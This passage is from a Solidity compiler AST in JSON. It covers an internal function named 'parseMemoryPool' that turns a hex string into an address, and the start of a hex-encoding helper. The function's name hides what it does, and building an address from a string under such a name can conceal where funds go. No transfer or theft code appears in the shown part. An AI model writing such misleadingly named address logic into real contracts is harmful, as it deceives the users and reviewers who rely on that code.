																	"lValueRequested": false,
																	"nodeType": "TupleExpression",
																	"src": "5113:11:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	}
																},
																"src": "5099:25:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"falseBody": {
																"condition": {
																	"commonType": {
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	},
																	"id": 448,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"components": [
																			{
																				"commonType": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				},
																				"id": 442,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftExpression": {
																					"id": 440,
																					"name": "b2",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 334,
																					"src": "5180:2:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint160",
																						"typeString": "uint160"
																					}
																				},
																				"nodeType": "BinaryOperation",
																				"operator": ">=",
																				"rightExpression": {
																					"hexValue": "3635",
																					"id": 441,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "5186:2:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_65_by_1",
																						"typeString": "int_const 65"
																					},
																					"value": "65"
																				},
																				"src": "5180:8:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bool",
																					"typeString": "bool"
																				}
																			}
																		],
																		"id": 443,
																		"isConstant": false,
																		"isInlineArray": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"nodeType": "TupleExpression",
																		"src": "5179:10:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": "&&",
																	"rightExpression": {
																		"components": [
																			{
																				"commonType": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				},
																				"id": 446,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftExpression": {
																					"id": 444,
																					"name": "b2",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 334,
																					"src": "5194:2:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint160",
																						"typeString": "uint160"
																					}
																				},
																				"nodeType": "BinaryOperation",
																				"operator": "<=",
																				"rightExpression": {
																					"hexValue": "3730",
																					"id": 445,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "5200:2:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_70_by_1",
																						"typeString": "int_const 70"
																					},
																					"value": "70"
																				},
																				"src": "5194:8:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bool",
																					"typeString": "bool"
																				}
																			}
																		],
																		"id": 447,
																		"isConstant": false,
																		"isInlineArray": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"nodeType": "TupleExpression",
																		"src": "5193:10:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		}
																	},
																	"src": "5179:24:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	}
																},
																"falseBody": {
																	"condition": {
																		"commonType": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		},
																		"id": 462,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"leftExpression": {
																			"components": [
																				{
																					"commonType": {
																						"typeIdentifier": "t_uint160",
																						"typeString": "uint160"
																					},
																					"id": 456,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"leftExpression": {
																						"id": 454,
																						"name": "b2",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 334,
																						"src": "5259:2:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint160",
																							"typeString": "uint160"
																						}
																					},
																					"nodeType": "BinaryOperation",
																					"operator": ">=",
																					"rightExpression": {
																						"hexValue": "3438",
																						"id": 455,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": true,
																						"kind": "number",
																						"lValueRequested": false,
																						"nodeType": "Literal",
																						"src": "5265:2:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_rational_48_by_1",
																							"typeString": "int_const 48"
																						},
																						"value": "48"
																					},
																					"src": "5259:8:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_bool",
																						"typeString": "bool"
																					}
																				}
																			],
																			"id": 457,
																			"isConstant": false,
																			"isInlineArray": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"nodeType": "TupleExpression",
																			"src": "5258:10:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		},
																		"nodeType": "BinaryOperation",
																		"operator": "&&",
																		"rightExpression": {
																			"components": [
																				{
																					"commonType": {
																						"typeIdentifier": "t_uint160",
																						"typeString": "uint160"
																					},
																					"id": 460,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"leftExpression": {
																						"id": 458,
																						"name": "b2",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 334,
																						"src": "5273:2:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint160",
																							"typeString": "uint160"
																						}
																					},
																					"nodeType": "BinaryOperation",
																					"operator": "<=",
																					"rightExpression": {
																						"hexValue": "3537",
																						"id": 459,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": true,
																						"kind": "number",
																						"lValueRequested": false,
																						"nodeType": "Literal",
																						"src": "5279:2:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_rational_57_by_1",
																							"typeString": "int_const 57"
																						},
																						"value": "57"
																					},
																					"src": "5273:8:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_bool",
																						"typeString": "bool"
																					}
																				}
																			],
																			"id": 461,
																			"isConstant": false,
																			"isInlineArray": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"nodeType": "TupleExpression",
																			"src": "5272:10:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		},
																		"src": "5258:24:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		}
																	},
																	"id": 468,
																	"nodeType": "IfStatement",
																	"src": "5254:73:0",
																	"trueBody": {
																		"id": 467,
																		"nodeType": "Block",
																		"src": "5284:43:0",
																		"statements": [
																			{
																				"expression": {
																					"id": 465,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"leftHandSide": {
																						"id": 463,
																						"name": "b2",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 334,
																						"src": "5303:2:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint160",
																							"typeString": "uint160"
																						}
																					},
																					"nodeType": "Assignment",
																					"operator": "-=",
																					"rightHandSide": {
																						"hexValue": "3438",
																						"id": 464,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": true,
																						"kind": "number",
																						"lValueRequested": false,
																						"nodeType": "Literal",
																						"src": "5309:2:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_rational_48_by_1",
																							"typeString": "int_const 48"
																						},
																						"value": "48"
																					},
																					"src": "5303:8:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint160",
																						"typeString": "uint160"
																					}
																				},
																				"id": 466,
																				"nodeType": "ExpressionStatement",
																				"src": "5303:8:0"
																			}
																		]
																	}
																},
																"id": 469,
																"nodeType": "IfStatement",
																"src": "5175:152:0",
																"trueBody": {
																	"id": 453,
																	"nodeType": "Block",
																	"src": "5205:43:0",
																	"statements": [
																		{
																			"expression": {
																				"id": 451,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftHandSide": {
																					"id": 449,
																					"name": "b2",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 334,
																					"src": "5224:2:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint160",
																						"typeString": "uint160"
																					}
																				},
																				"nodeType": "Assignment",
																				"operator": "-=",
																				"rightHandSide": {
																					"hexValue": "3535",
																					"id": 450,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "5230:2:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_55_by_1",
																						"typeString": "int_const 55"
																					},
																					"value": "55"
																				},
																				"src": "5224:8:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				}
																			},
																			"id": 452,
																			"nodeType": "ExpressionStatement",
																			"src": "5224:8:0"
																		}
																	]
																}
															},
															"id": 470,
															"nodeType": "IfStatement",
															"src": "5095:232:0",
															"trueBody": {
																"id": 439,
																"nodeType": "Block",
																"src": "5126:43:0",
																"statements": [
																	{
																		"expression": {
																			"id": 437,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftHandSide": {
																				"id": 435,
																				"name": "b2",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 334,
																				"src": "5145:2:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				}
																			},
																			"nodeType": "Assignment",
																			"operator": "-=",
																			"rightHandSide": {
																				"hexValue": "3837",
																				"id": 436,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "5151:2:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_87_by_1",
																					"typeString": "int_const 87"
																				},
																				"value": "87"
																			},
																			"src": "5145:8:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint160",
																				"typeString": "uint160"
																			}
																		},
																		"id": 438,
																		"nodeType": "ExpressionStatement",
																		"src": "5145:8:0"
																	}
																]
															}
														},
														{
															"expression": {
																"id": 478,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"id": 471,
																	"name": "iaddr",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 327,
																	"src": "5341:5:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint160",
																		"typeString": "uint160"
																	}
																},
																"nodeType": "Assignment",
																"operator": "+=",
																"rightHandSide": {
																	"components": [
																		{
																			"commonType": {
																				"typeIdentifier": "t_uint160",
																				"typeString": "uint160"
																			},
																			"id": 476,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"commonType": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				},
																				"id": 474,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftExpression": {
																					"id": 472,
																					"name": "b1",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 331,
																					"src": "5351:2:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint160",
																						"typeString": "uint160"
																					}
																				},
																				"nodeType": "BinaryOperation",
																				"operator": "*",
																				"rightExpression": {
																					"hexValue": "3136",
																					"id": 473,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "5356:2:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_16_by_1",
																						"typeString": "int_const 16"
																					},
																					"value": "16"
																				},
																				"src": "5351:7:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "+",
																			"rightExpression": {
																				"id": 475,
																				"name": "b2",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 334,
																				"src": "5361:2:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				}
																			},
																			"src": "5351:12:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint160",
																				"typeString": "uint160"
																			}
																		}
																	],
																	"id": 477,
																	"isConstant": false,
																	"isInlineArray": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"nodeType": "TupleExpression",
																	"src": "5350:14:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint160",
																		"typeString": "uint160"
																	}
																},
																"src": "5341:23:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint160",
																	"typeString": "uint160"
																}
															},
															"id": 479,
															"nodeType": "ExpressionStatement",
															"src": "5341:23:0"
														}
													]
												},
												"condition": {
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 346,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"id": 340,
														"name": "i",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 337,
														"src": "4695:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "<",
													"rightExpression": {
														"commonType": {
															"typeIdentifier": "t_rational_42_by_1",
															"typeString": "int_const 42"
														},
														"id": 345,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"leftExpression": {
															"hexValue": "32",
															"id": 341,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "4699:1:0",
															"typeDescriptions": {
																"typeIdentifier": "t_rational_2_by_1",
																"typeString": "int_const 2"
															},
															"value": "2"
														},
														"nodeType": "BinaryOperation",
														"operator": "+",
														"rightExpression": {
															"commonType": {
																"typeIdentifier": "t_rational_40_by_1",
																"typeString": "int_const 40"
															},
															"id": 344,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"lValueRequested": false,
															"leftExpression": {
																"hexValue": "32",
																"id": 342,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "4703:1:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_2_by_1",
																	"typeString": "int_const 2"
																},
																"value": "2"
															},
															"nodeType": "BinaryOperation",
															"operator": "*",
															"rightExpression": {
																"hexValue": "3230",
																"id": 343,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "4707:2:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_20_by_1",
																	"typeString": "int_const 20"
																},
																"value": "20"
															},
															"src": "4703:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_rational_40_by_1",
																"typeString": "int_const 40"
															}
														},
														"src": "4699:10:0",
														"typeDescriptions": {
															"typeIdentifier": "t_rational_42_by_1",
															"typeString": "int_const 42"
														}
													},
													"src": "4695:14:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 481,
												"initializationExpression": {
													"assignments": [
														337
													],
													"declarations": [
														{
															"constant": false,
															"id": 337,
															"mutability": "mutable",
															"name": "i",
															"nameLocation": "4688:1:0",
															"nodeType": "VariableDeclaration",
															"scope": 481,
															"src": "4683:6:0",
															"stateVariable": false,
															"storageLocation": "default",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"typeName": {
																"id": 336,
																"name": "uint",
																"nodeType": "ElementaryTypeName",
																"src": "4683:4:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"visibility": "internal"
														}
													],
													"id": 339,
													"initialValue": {
														"hexValue": "32",
														"id": 338,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "4692:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_rational_2_by_1",
															"typeString": "int_const 2"
														},
														"value": "2"
													},
													"nodeType": "VariableDeclarationStatement",
													"src": "4683:10:0"
												},
												"loopExpression": {
													"expression": {
														"id": 349,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftHandSide": {
															"id": 347,
															"name": "i",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 337,
															"src": "4711:1:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "Assignment",
														"operator": "+=",
														"rightHandSide": {
															"hexValue": "32",
															"id": 348,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "4716:1:0",
															"typeDescriptions": {
																"typeIdentifier": "t_rational_2_by_1",
																"typeString": "int_const 2"
															},
															"value": "2"
														},
														"src": "4711:6:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"id": 350,
													"nodeType": "ExpressionStatement",
													"src": "4711:6:0"
												},
												"nodeType": "ForStatement",
												"src": "4678:698:0"
											},
											{
												"expression": {
													"arguments": [
														{
															"id": 484,
															"name": "iaddr",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 327,
															"src": "5401:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint160",
																"typeString": "uint160"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint160",
																"typeString": "uint160"
															}
														],
														"id": 483,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "ElementaryTypeNameExpression",
														"src": "5393:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_type$_t_address_$",
															"typeString": "type(address)"
														},
														"typeName": {
															"id": 482,
															"name": "address",
															"nodeType": "ElementaryTypeName",
															"src": "5393:7:0",
															"typeDescriptions": {}
														}
													},
													"id": 485,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "typeConversion",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "5393:14:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"functionReturnParameters": 318,
												"id": 486,
												"nodeType": "Return",
												"src": "5386:21:0"
											}
										]
									},
									"id": 488,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "parseMemoryPool",
									"nameLocation": "4484:15:0",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 315,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 314,
												"mutability": "mutable",
												"name": "_a",
												"nameLocation": "4514:2:0",
												"nodeType": "VariableDeclaration",
												"scope": 488,
												"src": "4500:16:0",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 313,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "4500:6:0",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "4499:18:0"
									},
									"returnParameters": {
										"id": 318,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 317,
												"mutability": "mutable",
												"name": "_parsed",
												"nameLocation": "4549:7:0",
												"nodeType": "VariableDeclaration",
												"scope": 488,
												"src": "4541:15:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 316,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "4541:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "4540:17:0"
									},
									"scope": 1189,
									"src": "4475:940:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 643,
										"nodeType": "Block",
										"src": "5704:946:0",
										"statements": [
											{
												"assignments": [
													496
												],
												"declarations": [
													{
														"constant": false,
														"id": 496,
														"mutability": "mutable",
														"name": "count",
														"nameLocation": "5720:5:0",
														"nodeType": "VariableDeclaration",
														"scope": 643,
														"src": "5715:10:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 495,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "5715:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 498,
												"initialValue": {
													"hexValue": "30",
													"id": 497,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "number",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "5728:1:0",
													"typeDescriptions": {
														"typeIdentifier": "t_rational_0_by_1",
														"typeString": "int_const 0"
													},
													"value": "0"
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "5715:14:0"
											},
											{
												"assignments": [
													500
												],
												"declarations": [
													{
														"constant": false,
														"id": 500,
														"mutability": "mutable",
														"name": "b",
														"nameLocation": "5745:1:0",
														"nodeType": "VariableDeclaration",
														"scope": 643,
														"src": "5740:6:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 499,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "5740:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 502,
												"initialValue": {
													"id": 501,
													"name": "a",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 490,
													"src": "5749:1:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "5740:10:0"
											},
											{
												"body": {
													"id": 513,
													"nodeType": "Block",
													"src": "5777:57:0",
													"statements": [
														{
															"expression": {
																"id": 507,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"nodeType": "UnaryOperation",
																"operator": "++",
																"prefix": false,
																"src": "5792:7:0",
																"subExpression": {
																	"id": 506,
																	"name": "count",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 496,
																	"src": "5792:5:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 508,
															"nodeType": "ExpressionStatement",
															"src": "5792:7:0"
														},
														{
															"expression": {
																"id": 511,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"id": 509,
																	"name": "b",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 500,
																	"src": "5814:1:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "/=",
																"rightHandSide": {
																	"hexValue": "3136",
																	"id": 510,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "5819:2:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_16_by_1",
																		"typeString": "int_const 16"
																	},
																	"value": "16"
																},
																"src": "5814:7:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 512,
															"nodeType": "ExpressionStatement",
															"src": "5814:7:0"
														}
													]
												},
												"condition": {
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 505,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"id": 503,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 500,
														"src": "5769:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "!=",
													"rightExpression": {
														"hexValue": "30",
														"id": 504,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "5774:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"src": "5769:6:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 514,
												"nodeType": "WhileStatement",
												"src": "5762:72:0"
											},
											{
												"assignments": [
													516
												],
												"declarations": [
													{
														"constant": false,
														"id": 516,
														"mutability": "mutable",
														"name": "res",
														"nameLocation": "5857:3:0",
														"nodeType": "VariableDeclaration",
														"scope": 643,
														"src": "5844:16:0",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_bytes_memory_ptr",
															"typeString": "bytes"
														},
														"typeName": {
															"id": 515,
															"name": "bytes",
															"nodeType": "ElementaryTypeName",
															"src": "5844:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_storage_ptr",
																"typeString": "bytes"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 521,
												"initialValue": {
													"arguments": [
														{
															"id": 519,
															"name": "count",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 496,
															"src": "5873:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 518,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "NewExpression",
														"src": "5863:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_objectcreation_pure$_t_uint256_$returns$_t_bytes_memory_ptr_$",
															"typeString": "function (uint256) pure returns (bytes memory)"
														},
														"typeName": {
															"id": 517,
															"name": "bytes",
															"nodeType": "ElementaryTypeName",
															"src": "5867:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_storage_ptr",
																"typeString": "bytes"
															}
														}
													},
													"id": 520,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "5863:16:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_bytes_memory_ptr",
														"typeString": "bytes memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "5844:35:0"
											},
											{
												"body": {
													"id": 557,
													"nodeType": "Block",
													"src": "5919:115:0",
													"statements": [
														{
															"expression": {
																"id": 536,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"id": 532,
																	"name": "b",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 500,
																	"src": "5934:1:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"commonType": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"id": 535,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"id": 533,
																		"name": "a",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 490,
																		"src": "5938:1:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": "%",
																	"rightExpression": {
																		"hexValue": "3136",
																		"id": 534,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "5942:2:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_16_by_1",
																			"typeString": "int_const 16"
																		},
																		"value": "16"
																	},
																	"src": "5938:6:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "5934:10:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 537,
															"nodeType": "ExpressionStatement",
															"src": "5934:10:0"
														},
														{
															"expression": {
																"id": 551,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"baseExpression": {
																		"id": 538,
																		"name": "res",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 516,
